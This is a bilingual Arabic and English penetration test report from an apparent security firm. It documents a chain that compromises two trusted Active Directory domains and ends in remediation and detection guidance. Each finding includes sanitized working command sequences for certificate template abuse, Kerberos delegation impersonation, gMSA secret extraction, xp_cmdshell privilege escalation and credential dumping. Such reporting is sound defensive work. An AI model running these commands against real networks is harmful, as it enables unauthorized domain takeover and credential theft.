<div align="center">

# تقييم اختراق شامل لبيئة Active Directory عابرة للنطاقات

<img src="https://img.shields.io/badge/Severity-Critical-red?style=for-the-badge" alt="Critical"/>
<img src="https://img.shields.io/badge/CVSS-9.8-red?style=for-the-badge" alt="CVSS 9.8"/>
<img src="https://img.shields.io/badge/Environment-Internal_AD-blue?style=for-the-badge" alt="Internal AD"/>
<img src="https://img.shields.io/badge/Focus-ADCS%20%7C%20Kerberos%20%7C%20RBCD-purple?style=for-the-badge" alt="Focus"/>

**AMN SECURITY**  
*استشارات الأمن الهجومي*

</div>

---

# 🇸🇦 النسخة العربية — التقرير الأساسي

## 1. الملخص التنفيذي

نفّذت **AMN SECURITY** اختبار اختراق داخلي على بيئة Active Directory مؤسسية مجزّأة تحتوي على نطاقين موثوقين من Windows. أظهر التقييم مسار اختراق كامل يبدأ من مستخدم عادي في النطاق وصولاً إلى صلاحيات مدير النطاق (Domain Administrator)، من خلال ربط سلسلة من نقاط الضعف: سوء إعدادات خدمات الشهادات (AD CS)، إساءة استخدام ثقة Kerberos العابرة بين النطاقات، كشف حسابات الخدمة المُدارة الجماعياً (gMSA)، تفويض مقيد يعتمد على الموارد (RBCD)، ورفع الصلاحيات المحلي داخل SQL Server.

تم تعمية جميع معرّفات العميل، وأسماء المضيفين، وعناوين IP، وأسماء المستخدمين، وكلمات المرور، والهاشات، والمفاتيح، وأسماء الملفات في هذا التقرير العام. لكن التسلسل التقني وشروط الخطر والتوصيات الدفاعية تبقى دقيقة وقابلة للتطبيق الفعلي.

| البند | القيمة |
|---|---|
| نوع التقييم | اختبار اختراق داخلي لـ Active Directory |
| البيئة | شبكة مؤسسية مجزّأة من Windows |
| الأثر | اختراق كامل للنطاق (أ) والنطاق (ب) |
| مستوى الوصول الابتدائي | مستخدم عادي مصادَق عليه |
| مستوى الوصول النهائي | Domain Administrator |
| الخطورة | حرجة (Critical) |
| درجة CVSS v3.1 | 9.8 |
| المنهجية | PTES، MITRE ATT&CK، خرائط ADCS ESC، تحقق يدوي من إساءة استخدام Kerberos |

---

## 2. نطاق التقييم ونظرة عامة

احتوت البيئة المُقيَّمة على نطاقين من Active Directory مربوطين بعلاقة ثقة (Trust):

| الأصل المُعمّى | الوصف |
|---|---|
| `dc-a01.corp.local` | متحكم بالنطاق وخادم AD CS للنطاق (أ) |
| `dc-b01.trust.local` | متحكم بالنطاق وخادم MSSQL للنطاق (ب) |
| النطاق (أ) | نطاق الهوية المؤسسية الرئيسي |
| النطاق (ب) | نطاق فرعي/شريك موثوق |
| AD CS | سلطة شهادات مؤسسية تحتوي قوالب ضعيفة |
| SQL Server |实例 MSSQL مدمج مع النطاق يعمل بحساب خدمة |

كان التجزئة الشبكية موجودة، لكن الوصول المصادَق عليه إلى النطاق (أ) سمح بالعبور إلى النطاق (ب) بعد اكتشاف المسارات وإنشاء نفق (Tunnel).

---

## 3. مسار الهجوم العام

```text
مستخدم عادي الصلاحيات
        |
        v
استغلال AD CS ESC13 عبر ربط سياسة الإصدار بمجموعة وصول مميزة
        |
        v
وصول WinRM عبر العضوية المستمدة من الشهادة
        |
        v
عبور داخلي إلى النطاق الموثوق
        |
        v
إساءة استخدام Kerberos العابر للنطاقات + صلاحيات ACL على مجموعة gMSA
        |
        v
استخراج مادة كلمة مرور gMSA
        |
        v
الوصول إلى نقطة PowerShell مقيدة وكشف اعتمادات
        |
        v
وصول بمستوى مستخدم في النطاق الموثوق
        |
        v
RBCD نحو حساب خدمة SQL + انتحال S4U
        |
        v
تنفيذ أوامر عبر MSSQL xp_cmdshell بهوية حساب SQL
        |
        v
SeImpersonatePrivilege -> SYSTEM عبر تقنية من فئة Potato
        |
        v
مسؤول محلي على متحكم النطاق الموثوق
        |
        v
استخراج اعتمادات ومسار عودة عابر للنطاقات
        |
        v
استغلال AD CS ESC4 للسيطرة على قالب الشهادة
        |
        v
إصدار شهادة بصلاحيات Administrator
        |
        v
اختراق كامل لـ Domain Administrator
```

---

## 4. أهم النتائج

### 4.1 AD CS ESC13 — ربط سياسة الإصدار بمجموعة وصول مميزة

**الخطورة:** حرجة  
**المنطقة المتأثرة:** AD CS في النطاق (أ)  
**الأثر:** يمكن للمستخدمين المصادَق عليهم طلب شهادة من قالب ترتبط سياسة إصداره بالمستخدم إلى مجموعة ذات صلاحيات وصول لإدارة الأنظمة عن بُعد.

تم تحديد قالب شهادة مهيّأ للمصادقة العميلة ومرتبط بسياسة إصدار تربط مقدّم الطلب بمجموعة وصول تُستخدم للإدارة عن بُعد. يمكن للمستخدم العادي التسجيل في القالب والحصول على وصول قائم على الشهادة لخدمات الإدارة.

**التحقق المُعمّى:**

```bash
certipy find -k -dc-ip <DC_A_IP> -target dc-a01.corp.local -vulnerable -stdout
certipy req -u '<USER>@corp.local' -p '<PASSWORD>' \
  -dc-ip <DC_A_IP> -target dc-a01.corp.local \
  -ca '<CA_NAME>' -template '<TEMP_REMOTE_TEMPLATE>' -k
certipy auth -pfx '<USER>.pfx' -dc-ip <DC_A_IP>
```

**النتيجة:** حصل الحساب على وصول WinRM فعلي عبر العضوية المستمدة من الشهادة.

---

### 4.2 إساءة استخدام ثقة Kerberos العابرة للنطاقات

**الخطورة:** عالية  
**المنطقة المتأثرة:** حدود الثقة بين النطاقات  
**الأثر:** استطاعت هوية من النطاق (أ) الحصول على تذاكر خدمة لـ LDAP في النطاق (ب) وتنفيذ تعديلات مميزة على الكائنات بسبب صلاحيات مفوّضة.

بعد الوصول الأولي، تم طلب تذاكر Kerberos عابرة للنطاق لخدمات في النطاق (ب). وكان للمستخدم مسار هجومي نحو مجموعة إدارة gMSA في النطاق الموثوق.

**التحقق المُعمّى:**

```bash
export KRB5CCNAME=<USER>.ccache
kvno krbtgt/trust.local
kvno ldap/dc-b01.trust.local
bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k get object '<TARGET_GROUP>' --attr distinguishedName,groupType
```

---

### 4.3 إساءة استخدام مجموعة إدارة gMSA كشفت أسرار الحساب المُدار

**الخطورة:** حرجة  
**المنطقة المتأثرة:** إدارة الهوية في النطاق (ب)  
**الأثر:** يمكن للمهاجم إضافة نفسه إلى مجموعة مسموح لها بقراءة مادة كلمة مرور gMSA.

كان بالإمكان تعديل المجموعة المسؤولة عن قُرّاء gMSA عبر مسار صلاحيات ACL. بعد إضافة الأصل الأمني الأجنبي (Foreign Security Principal) إلى المجموعة وتحديث تذاكر Kerberos، أصبحت مادة كلمة مرور gMSA قابلة للاسترداد.

**التحقق المُعمّى:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local --dc-ip <DC_B_IP> \
  -u '<USER>' -k add genericAll '<GMSA_MANAGERS_DN>' '<USER_SID>'

bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k add groupMember '<GMSA_MANAGERS_DN>' '<USER_SID>'

ldeep ldap -k -s ldap://dc-b01.trust.local -d TRUST.LOCAL gmsa
```

**النتيجة:** تم الحصول على مادة المفتاح AES لحساب الخدمة المُدار واستُخدمت لطلب TGT.

---

### 4.4 نقطة PowerShell المقيدة كشفت اعتمادات مميزة

**الخطورة:** عالية  
**المنطقة المتأثرة:** تقوية الأطراف ونظافة العمليات  
**الأثر:** كشف تاريخ أوامر PowerShell اعتمادات قابلة لإعادة الاستخدام لمستخدم في النطاق الموثوق.

باستخدام سياق Kerberos الخاص بـ gMSA، كان الوصول متاحاً إلى نقطة PowerShell مقيدة. تقيد هذه النقطة الأوامر المتاحة، لكن استدعاء كتل السكربت سمح بقراءة تاريخ الأوامر. كان التاريخ يحتوي على أمر إنشاء PSCredential بكلمة مرور صريحة.

**التحقق المُعمّى:**

```powershell
&{cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine}
&{(Get-Content 'ConsoleHost_history.txt') -join "`n"}
```

**النتيجة:** تم استرداد اعتمادات مستخدم إدارة عن بُعد في النطاق (ب).

---

### 4.5 RBCD نحو حساب خدمة SQL مكّن انتحال MSSQL

**الخطورة:** حرجة  
**المنطقة المتأثرة:** تفويض Kerberos و SQL Server  
**الأثر:** استطاع gMSA انتحال مستخدم ذي صلاحيات SQL تجاه SPN الخاص بـ MSSQL.

كان للمستخدم المُسترد في النطاق (ب) صلاحيات تكوين التفويض المقيد المعتمد على الموارد على حساب خدمة SQL. سمح ذلك لـ gMSA بانتحال مدير SQL تجاه خدمة MSSQL.

**التحقق المُعمّى:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local -u '<TRUST_USER>' \
  -k add rbcd '<SQL_SERVICE_ACCOUNT>' '<GMSA_ACCOUNT>$'

getST.py -spn 'mssqlsvc/dc-b01.trust.local' \
  -impersonate '<SQL_ADMIN_USER>' \
  -dc-ip <DC_B_IP> trust.local/'<GMSA_ACCOUNT>$' -aesKey '<GMSA_AES_KEY>'

mssqlclient.py trust.local/'<SQL_ADMIN_USER>'@dc-b01.trust.local -k -no-pass
```

---

### 4.6 حساب خدمة SQL يمتلك SeImpersonatePrivilege

**الخطورة:** حرجة  
**المنطقة المتأثرة:** حدود صلاحيات مضيف SQL Server  
**الأثر:** تم رفع تنفيذ الأوامر عبر SQL Server إلى مستوى SYSTEM محلي.

تُنفَّذ `xp_cmdshell` بهوية حساب خدمة SQL. ويمتلك هذا الحساب `SeImpersonatePrivilege`، ما يتيح رفع الصلاحيات المحلي بتقنية انتحال عبر named pipe من فئة Potato. تم منح العضوية الإدارية المحلية للمستخدم المُسترد من النطاق (ب).

**التحقق المُعمّى:**

```sql
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'C:\Path\To\PrivilegeEscalation.exe -cmd "net localgroup administrators /add <TRUST_USER>"';
```

**النتيجة:** أصبح المستخدم المُسترد من النطاق (ب) مسؤولاً محلياً على متحكم/مضيف SQL الخاص بالنطاق (ب).

---

### 4.7 استخراج اعتمادات النطاق مهّد لاختراق عابر للنطاقات

**الخطورة:** حرجة  
**المنطقة المتأثرة:** أمان اعتمادات النطاق (ب)  
**الأثر:** سمح الوصول الإداري المحلي باستخراج أسرار النطاق، بما في ذلك مستخدم يمتلك صلاحيات تصعيد نحو النطاق (أ).

بعد تحقيق الوصول الإداري المحلي على متحكم النطاق (ب)، استُخدمت تقنيات ت replica الدليل لاستخراج مواد اعتماد محددة. وكان لأحد أصول النطاق (ب) حقوق عابرة للنطاقات ذات صلة بالتحكم في قالب شهادة النطاق (أ).

**التحقق المُعمّى:**

```bash
secretsdump.py trust.local/'<TRUST_USER>:<PASSWORD>'@dc-b01.trust.local -k -just-dc-user '<CROSS_FOREST_USER>'
getTGT.py trust.local/'<CROSS_FOREST_USER>' -aesKey '<AES256_KEY>' -dc-ip <DC_B_IP>
kvno ldap/dc-a01.corp.local@CORP.LOCAL
```

---

### 4.8 AD CS ESC4 — السيطرة على قالب الشهادة

**الخطورة:** حرجة  
**المنطقة المتأثرة:** صلاحيات قوالب AD CS في النطاق (أ)  
**الأثر:** استطاع المهاجم تعديل قالب شهادة للسماح بتسجيل SAN/UPN/SID تعسفي وإصدار شهادة بصفة مدير النطاق.

كان للأصل العابر للنطاقات صلاحيات كافية لتعديل قالب شهادة AD CS. أُعيد تهيئة القالب لتمكين مصادقة العميل، وإزالة شرط الموافقة/التوقيع من المدير، والسماح بالتحكم في اسم بديل للموضوع (SAN).

**التحقق المُعمّى:**

```bash
TEMPLATE_DN='CN=<SMARTCARD_TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  add genericAll "$TEMPLATE_DN" 'Domain Users'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Name-Flag -v 1

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Enrollment-Flag -v 0

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" pKIExtendedKeyUsage -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Application-Policy -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-RA-Signature -v 0
```

بعد تعديل القالب، تم طلب شهادة بصفة حساب مدير النطاق (أ):

```bash
certipy req -k -u '<USER>@corp.local' -pfx '<USER>.pfx' \
  -target dc-a01.corp.local -dc-host dc-a01.corp.local -dc-ip <DC_A_IP> \
  -ca '<CA_NAME>' -template '<SMARTCARD_TEMPLATE>' \
  -upn Administrator@corp.local -sid '<DOMAIN_ADMIN_SID>'

certipy auth -pfx administrator.pfx -dc-ip <DC_A_IP> \
  -username Administrator -domain corp.local
```

**النتيجة:** تم الحصول على TGT و NT hash صالحين لحساب مدير النطاق (أ).

---

## 5. الأثر

حقق مستخدم منخفض الصلاحيات اختراقاً كاملاً لنطاقين موثوقين من Active Directory. وفر مسار الهجوم:

- وصول إدارة عن بُعد لأنظمة النطاق (أ).
- العبور إلى نطاق موثوق مجزّأ.
- قراءة مادة كلمة مرور gMSA.
- استرداد كلمات مرور صريحة من تاريخ PowerShell.
- تنفيذ أوامر عبر SQL Server.
- تنفيذ محلي كـ SYSTEM عبر إساءة استخدام صلاحية الانتحال.
- مسؤول محلي على متحكم/مضيف SQL.
- استخراج انتقائي للاعتمادات.
- السيطرة على قالب شهادة.
- مصادقة Domain Administrator عبر تسجيل شهادة مزوّر.

---

## 6. ربط MITRE ATT&CK

| التقنية | المعرّف | الاستخدام |
|---|---:|---|
| حسابات صالحة | T1078 | الوصول الابتدائي واعتمادات النطاق الموثوق المُستردة |
| استكشاف الحسابات | T1087 | تعداد LDAP وأنماط شبيهة بـ BloodHound |
| خدمات عن بُعد: WinRM | T1021.006 | وصول الإدارة عبر الصلاحيات المستمدة من الشهادة |
| سرقة أو تزوير تذاكر Kerberos | T1558 | تذاكر عابرة للنطاق، S4U، TGT المستمدة من الشهادة |
| اعتمادات غير مؤمّنة | T1552 | تاريخ PowerShell كشف اعتمادات |
| استغلال لرفع الصلاحيات | T1068 | انتحال بفئة Potato للوصول إلى SYSTEM |
| استخراج اعتمادات النظام: DCSync | T1003.006 | استخراج اعتمادات عبر replica الدليل |
| إساءة استخدام آلية الرفع | T1548 | إضافة مسؤول محلي بعد تنفيذ SYSTEM |
| استغلال خدمات شهادات Active Directory | N/A | مسارا هجوم ESC13 و ESC4 |

---

## 7. تحليل السبب الجذري

لم ينشأ الاختراق من ثغرة واحدة، بل من سلسلة من نقاط ضعف في ضبط الهوية:

1. منح قوالب الشهادات حقوق تسجيل واسعة جداً.
2. ربط سياسات الإصدار بمجموعات تفويض مميزة.
3. عدم مراجعة صلاحيات الثقة العابرة للنطاقات لمسارات صلاحية غير مقصودة.
4. إمكانية تعديل مجموعات قُرّاء gMSA من حسابات خارج حدودها الإدارية المقصودة.
5. عدم ضبط تاريخ PowerShell على الأطراف/النقاط المقيدة الحساسة.
6. احتفاظ حسابات خدمة SQL بصلاحيات انتحال ويمكن الوصول إليها من مسارات شبكية بعد العبور.
7. السماح بتعديل قوالب AD CS من قبل غير مدراء PKI.

---

## 8. توصيات العلاج

### إجراءات فورية

- تعطيل أو تقييد قوالب AD CS الضعيفة حتى تتم مراجعة الصلاحيات.
- إزالة حقوق التسجيل الواسعة من القوالب التي تتضمن EKU للمصادقة العميلة.
- مراجعة سياسات الإصدار المرتبطة بمجموعات الأمان وإزالة ربط المجموعات ذات الصلاحيات.
- إزالة الأعضاء غير المصرّح بهم والأصول الأمنية الأجنبية من مجموعات قُرّاء/مدراء gMSA.
- تدوير كلمات مرور المستخدمين المكشوفة وكل مفاتيح gMSA المتأثرة.
- تعطيل `xp_cmdshell` ما لم يكن مطلوباً ومراقَباً صراحةً.
- إزالة الإضافات الإدارية المحلية التي أُنشئت أثناء التقييم.
- مراجعة وإعادة تعيين اعتمادات الحسابات المعرّضة عبر replica الدليل.

### تصلب AD CS

- مراجعة كل القوالب لمعرفة سوء الإعداد بأنماط ESC1–ESC15.
- تقييد حقوق تعديل القوالب لمدراء PKI مخصصين فقط.
- اشتراط موافقة المدير أو توقيع مفوض للقوالب عالية الأثر.
- منع الاسم البديل للموضوع الذي يوفّره مقدّم الطلب ما لم يكن مطلوباً بعملية موثّقة.
- مراقبة طلبات الشهادات التي تحوي UPN أو SID لحسابات مميزة.
- تفعيل تدقيق أحداث CA وإعادة توجيهها إلى SIEM.

### ضوابط Kerberos والثقة

- مراجعة كل علاقات الثقة العابرة للنطاقات وإعدادات تصفية SID.
- تدقيق الأصول الأمنية الأجنبية في المجموعات المميزة.
- مراقبة طلبات TGS عابرة للنطاقات من أصول غير معتادة.
- فرض أقل صلاحية للـ ACLs التي تتحكم بالمجموعات وحسابات الخدمة وإعدادات التفويض.

### ضوابط gMSA

- حصر `PrincipalsAllowedToRetrieveManagedPassword` بمجموعات محددة بصرامة.
- مراقبة قراءات `msDS-ManagedPassword` والتغييرات على مجموعات قُرّاء gMSA.
- التعامل مع مفاتيح gMSA AES كأسرار عالية القيمة تعادل كلمات مرور حسابات الخدمة.

### ضوابط SQL Server

- تشغيل خدمات SQL تحت هويات بأقل صلاحية.
- إزالة الصلاحيات المحلية غير الضرورية من حسابات الخدمة.
- تعطيل `xp_cmdshell` والتنبيه عند تفعيلها.
- فصل خدمات SQL عن متحكمات النطاق حيثما أمكن.

### ضوابط الأطراف

- تعطيل تاريخ PowerShell المستمر للحسابات الحساسة والنقاط المقيدة.
- مسح ملفات PSReadLine التاريخية بعد تعرّض أي اعتماد.
- نشر تسجيل أوامر PowerShell وكتل السكربت مع إعادة توجيه آمن.
- منع كلمات المرور الصريحة في تاريخ الأوامر والسكربتات والملاحظات التشغيلية.

---

## 9. فرص الكشف

| مجال الكشف | الإشارة |
|---|---|
| AD CS | تسجيل شهادة بمجموعات UPN/SID مميزة |
| AD CS | تعديلات على القوالب (EKU أو SAN أو أعلام التسجيل أو إعدادات الموافقة) |
| Kerberos | طلبات TGS عابرة للنطاقات من أصول غير معتادة |
| LDAP | كتابات على `groupType` و `member` و `nTSecurityDescriptor` وسمات RBCD |
| gMSA | قراءات مادة كلمة المرور من قبل أصول مضافة حديثاً |
| SQL Server | تفعيل `xp_cmdshell` وتنفيذ أوامر مشبوهة |
| Windows | تغييرات عضوية المجموعات المحلية على متحكمات النطاق |
| الأطراف | وصول إلى ملفات تاريخ PSReadLine من قبل حسابات خدمة |

---

# 🇬🇧 English Version — Secondary

## Executive Summary

AMN SECURITY performed an internal Active Directory penetration test against a segmented enterprise environment containing two trusted Windows domains. The assessment demonstrated a complete compromise path from a low-privileged domain user to full domain administrator access by chaining certificate services misconfigurations, cross-forest Kerberos trust abuse, group-managed service account exposure, resource-based constrained delegation, and SQL Server local privilege escalation.

All client identifiers, hostnames, IP addresses, usernames, passwords, hashes, keys, and file names in this public report have been sanitized. The technical sequence, risk conditions, and defensive recommendations remain accurate for real-world remediation.

| Item | Value |
|---|---|
| Assessment Type | Internal Active Directory Penetration Test |
| Environment | Segmented Windows Enterprise Network |
| Impact | Full compromise of Domain A and Domain B |
| Initial Access Level | Standard authenticated domain user |
| Final Access Level | Domain Administrator |
| Severity | Critical |
| CVSS v3.1 | 9.8 |
| Methodology | PTES, MITRE ATT&CK, ADCS ESC mapping, manual Kerberos abuse validation |

---

## Scope Overview

The assessed environment contained two Active Directory domains connected by a trust relationship:

| Sanitized Asset | Description |
|---|---|
| `dc-a01.corp.local` | Domain controller and AD CS server for Domain A |
| `dc-b01.trust.local` | Domain controller and SQL Server host for Domain B |
| Domain A | Primary corporate identity domain |
| Domain B | Trusted subsidiary/partner domain |
| AD CS | Enterprise CA with vulnerable templates |
| SQL Server | Domain-integrated MSSQL instance running under a service account |

Network segmentation was present, but authenticated access to Domain A allowed pivoting into Domain B after route discovery and tunnel establishment.

---

## Attack Path Overview

```text
Low-privileged user
        |
        v
AD CS ESC13 certificate issuance policy abuse
        |
        v
WinRM access through certificate-derived group membership
        |
        v
Internal pivot to trusted domain
        |
        v
Cross-forest Kerberos + ACL abuse against gMSA management group
        |
        v
gMSA password material extraction
        |
        v
Restricted PowerShell endpoint access and credential disclosure
        |
        v
User-level access in trusted domain
        |
        v
RBCD to SQL service account + S4U impersonation
        |
        v
MSSQL xp_cmdshell as SQL service identity
        |
        v
SeImpersonatePrivilege -> local SYSTEM via potato-class exploit
        |
        v
Local administrator on trusted DC
        |
        v
Credential dumping and cross-forest return path
        |
        v
AD CS ESC4 template takeover
        |
        v
Administrator certificate issuance
        |
        v
Domain Administrator compromise
```

---

## Key Findings

### 1. AD CS ESC13 — Issuance Policy Linked to Privileged Access Group

**Severity:** Critical  
**Affected Area:** Domain A AD CS  
**Impact:** Authenticated users could request a certificate from a template whose issuance policy mapped the requester into a privileged group used for remote management.

The assessment identified a certificate template configured for client authentication and linked to an issuance policy associated with a remote management access group. A standard user could enroll in the template and obtain certificate-based access to management services.

**Sanitized validation:**

```bash
certipy find -k -dc-ip <DC_A_IP> -target dc-a01.corp.local -vulnerable -stdout
certipy req -u '<USER>@corp.local' -p '<PASSWORD>' \
  -dc-ip <DC_A_IP> -target dc-a01.corp.local \
  -ca '<CA_NAME>' -template '<TEMP_REMOTE_TEMPLATE>' -k
certipy auth -pfx '<USER>.pfx' -dc-ip <DC_A_IP>
```

**Observed result:** the account received effective WinRM access through certificate-derived group membership.

---

### 2. Cross-Forest Kerberos Trust Abuse Enabled LDAP Operations in Trusted Domain

**Severity:** High  
**Affected Area:** Domain trust boundary  
**Impact:** A Domain A identity could obtain service tickets for Domain B LDAP and perform privileged object manipulation due to delegated rights.

After the initial foothold, Kerberos cross-realm tickets were requested for services in Domain B. The user had an attack path to a gMSA management group in the trusted domain.

**Sanitized validation:**

```bash
export KRB5CCNAME=<USER>.ccache
kvno krbtgt/trust.local
kvno ldap/dc-b01.trust.local
bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k get object '<TARGET_GROUP>' --attr distinguishedName,groupType
```

---

### 3. gMSA Management Group Abuse Exposed Managed Service Account Secrets

**Severity:** Critical  
**Affected Area:** Domain B identity management  
**Impact:** Attackers could add themselves to a group allowed to read gMSA password material.

The trusted-domain group controlling gMSA readers was modifiable through an ACL path. After adding the foreign security principal to the group and refreshing Kerberos tickets, the gMSA password material was retrievable.

**Sanitized validation:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local --dc-ip <DC_B_IP> \
  -u '<USER>' -k add genericAll '<GMSA_MANAGERS_DN>' '<USER_SID>'

bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k add groupMember '<GMSA_MANAGERS_DN>' '<USER_SID>'

ldeep ldap -k -s ldap://dc-b01.trust.local -d TRUST.LOCAL gmsa
```

**Observed result:** AES key material for the managed service account was obtained and used to request a TGT.

---

### 4. Restricted PowerShell Endpoint Leaked Privileged Credentials

**Severity:** High  
**Affected Area:** Endpoint hardening and operator hygiene  
**Impact:** Historical PowerShell commands exposed reusable credentials for a trusted-domain user.

Using the gMSA Kerberos context, a restricted PowerShell endpoint was accessible. The endpoint constrained available commands, but script block invocation allowed reading command history. The history contained a PSCredential creation command with a plaintext password.

**Sanitized validation:**

```powershell
&{cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine}
&{(Get-Content 'ConsoleHost_history.txt') -join "`n"}
```

**Observed result:** credentials for a remote management user in Domain B were recovered.

---

### 5. RBCD to SQL Service Account Enabled MSSQL Impersonation

**Severity:** Critical  
**Affected Area:** Kerberos delegation and SQL Server  
**Impact:** The gMSA could impersonate a SQL-privileged user to the MSSQL SPN.

The recovered Domain B user had rights to configure resource-based constrained delegation on a SQL service account. This allowed the gMSA to impersonate a SQL administrator principal to the MSSQL service.

**Sanitized validation:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local -u '<TRUST_USER>' \
  -k add rbcd '<SQL_SERVICE_ACCOUNT>' '<GMSA_ACCOUNT>$'

getST.py -spn 'mssqlsvc/dc-b01.trust.local' \
  -impersonate '<SQL_ADMIN_USER>' \
  -dc-ip <DC_B_IP> trust.local/'<GMSA_ACCOUNT>$' -aesKey '<GMSA_AES_KEY>'

mssqlclient.py trust.local/'<SQL_ADMIN_USER>'@dc-b01.trust.local -k -no-pass
```

---

### 6. SQL Server Service Account Had SeImpersonatePrivilege

**Severity:** Critical  
**Affected Area:** SQL Server host privilege boundary  
**Impact:** Command execution through SQL Server was elevated to local SYSTEM.

`xp_cmdshell` executed as the SQL service identity. The identity had `SeImpersonatePrivilege`, enabling local privilege escalation with a potato-class named-pipe impersonation technique. Local administrator membership was granted to the recovered Domain B user.

**Sanitized validation:**

```sql
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'C:\Path\To\PrivilegeEscalation.exe -cmd "net localgroup administrators /add <TRUST_USER>"';
```

**Observed result:** the recovered Domain B user became a local administrator on the Domain B controller/SQL host.

---

### 7. Domain Credential Dumping Exposed Cross-Forest Escalation Material

**Severity:** Critical  
**Affected Area:** Domain B credential security  
**Impact:** Local administrator access enabled extraction of domain secrets, including a user with escalation rights into Domain A.

After local administrator access was achieved on the Domain B controller, directory replication techniques were used to extract selected credential material. A Domain B principal possessed cross-forest rights relevant to Domain A certificate template control.

**Sanitized validation:**

```bash
secretsdump.py trust.local/'<TRUST_USER>:<PASSWORD>'@dc-b01.trust.local -k -just-dc-user '<CROSS_FOREST_USER>'
getTGT.py trust.local/'<CROSS_FOREST_USER>' -aesKey '<AES256_KEY>' -dc-ip <DC_B_IP>
kvno ldap/dc-a01.corp.local@CORP.LOCAL
```

---

### 8. AD CS ESC4 — Certificate Template Takeover

**Severity:** Critical  
**Affected Area:** Domain A AD CS template permissions  
**Impact:** The attacker could modify a certificate template to allow arbitrary SAN UPN/SID enrollment and request a certificate as the domain administrator.

The cross-forest principal had sufficient rights to modify an AD CS certificate template. The template was reconfigured to enable client authentication, remove manager approval/signature requirements, and allow subject alternative name control.

**Sanitized validation:**

```bash
TEMPLATE_DN='CN=<SMARTCARD_TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  add genericAll "$TEMPLATE_DN" 'Domain Users'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Name-Flag -v 1

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Enrollment-Flag -v 0

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" pKIExtendedKeyUsage -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Application-Policy -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-RA-Signature -v 0
```

After template modification, a certificate was requested for the Domain A administrator identity.

```bash
certipy req -k -u '<USER>@corp.local' -pfx '<USER>.pfx' \
  -target dc-a01.corp.local -dc-host dc-a01.corp.local -dc-ip <DC_A_IP> \
  -ca '<CA_NAME>' -template '<SMARTCARD_TEMPLATE>' \
  -upn Administrator@corp.local -sid '<DOMAIN_ADMIN_SID>'

certipy auth -pfx administrator.pfx -dc-ip <DC_A_IP> \
  -username Administrator -domain corp.local
```

**Observed result:** a valid Kerberos TGT and NT hash were obtained for the Domain A administrator account.

---

## Impact

A low-privileged user achieved complete compromise of two trusted Active Directory domains. The attack path provided:

- Remote management access to Domain A systems.
- Pivoting into a segmented trusted domain.
- Read access to gMSA password material.
- Recovery of reusable plaintext credentials from PowerShell history.
- SQL Server command execution.
- Local SYSTEM execution through impersonation privilege abuse.
- Local administrator access to a domain controller/SQL host.
- Selective credential dumping.
- Certificate template takeover.
- Domain Administrator authentication through forged certificate enrollment.

---

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---:|---|
| Valid Accounts | T1078 | Initial domain user access and recovered trusted-domain credentials |
| Account Discovery | T1087 | LDAP and BloodHound-style enumeration |
| Remote Services: WinRM | T1021.006 | Remote management access through certificate-derived privileges |
| Steal or Forge Kerberos Tickets | T1558 | Cross-realm tickets, S4U, certificate-derived TGTs |
| Unsecured Credentials | T1552 | PowerShell history exposed credentials |
| Exploitation for Privilege Escalation | T1068 | Potato-class impersonation to SYSTEM |
| OS Credential Dumping: DCSync | T1003.006 | Directory replication credential extraction |
| Abuse Elevation Control Mechanism | T1548 | Local admin addition after SYSTEM execution |
| Active Directory Certificate Services Abuse | N/A | ESC13 and ESC4 certificate attack paths |

---

## Root Cause Analysis

The compromise was not caused by a single vulnerability. It resulted from a chain of identity-control weaknesses:

1. Certificate templates granted enrollment to overly broad principals.
2. Issuance policies were linked to privileged authorization groups.
3. Cross-forest trust permissions were not reviewed for unintended privilege paths.
4. gMSA reader groups were modifiable by accounts outside their intended administrative boundary.
5. PowerShell history was not controlled on privileged/restricted endpoints.
6. SQL Server service accounts retained impersonation privileges and were reachable from pivoted network paths.
7. AD CS certificate templates allowed unsafe modification by non-CA administrators.

---

## Remediation Recommendations

### Immediate Actions

- Disable or restrict the vulnerable AD CS templates until permissions are reviewed.
- Remove broad enrollment rights from templates that include client authentication EKUs.
- Audit issuance policies linked to security groups and remove privilege-bearing group mappings.
